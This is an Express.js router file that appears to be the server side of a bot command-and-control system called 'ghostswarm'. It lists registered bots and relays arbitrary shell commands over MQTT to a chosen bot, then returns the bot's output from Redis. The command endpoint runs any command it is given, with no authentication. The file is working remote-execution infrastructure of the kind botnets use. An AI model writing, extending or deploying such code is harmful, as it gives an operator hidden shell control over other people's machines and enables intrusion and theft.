const express = require("express");
const router = express.Router();
const { getBots } = require('../utils/utils'); // Import utility function to get bots

// Get dependencies from parent context
let redis, mqttClient;

// Initialize function to set dependencies
function initBotRoutes(redisClient, mqttClientInstance) {
   redis = redisClient;
   mqttClient = mqttClientInstance;
}

router.get('/', async (req, res) => {
   try {
      if (!redis) {
         return res.status(500).json({ error: 'Server not properly initialized' });
      }

      const bots = await getBots(redis);

      res.json(bots);
   } catch (error) {
      console.error('❌ Error fetching bots:', error);
      res.status(500).json({ error: 'Failed to fetch bots' });
   }
});

router.post('/:botId/command', async (req, res) => {
   try {
      if (!redis || !mqttClient) {
         return res.status(500).json({ error: 'Server not properly initialized' });
      }

      const { botId } = req.params;
      const { command } = req.body;

      if (!command) {
         return res.status(400).json({ error: 'Command is required' });
      }

      const requestId = Date.now().toString();
      const topic = `ghostswarm/${botId}/command`;
      const payload = {
         type: 'shell',
         cmd: command,
         requestId
      };

      mqttClient.publish(topic, JSON.stringify(payload), { qos: 1 }, async (err) => {
         if (err) {
            console.error(`❌ Failed to send command to ${botId}:`, err);
            return res.status(500).json({ error: 'Failed to send command' });
         }

         // Wait for response
         let attempts = 0;
         const maxAttempts = 30; // 15 seconds timeout

         const checkResponse = async () => {
            const key = `resp:${botId}:${requestId}`;
            const response = await redis.get(key);

            if (response) {
               await redis.del(key); // Clean up
               return res.json({ output: JSON.parse(response) });
            }

            if (attempts++ < maxAttempts) {
               setTimeout(checkResponse, 500);
            } else {
               res.status(408).json({ error: 'Command timeout' });
            }
         };

         checkResponse();
      });
   } catch (error) {
      console.error('❌ Error sending command:', error);
      res.status(500).json({ error: 'Failed to send command' });
   }
});

module.exports = { router, initBotRoutes };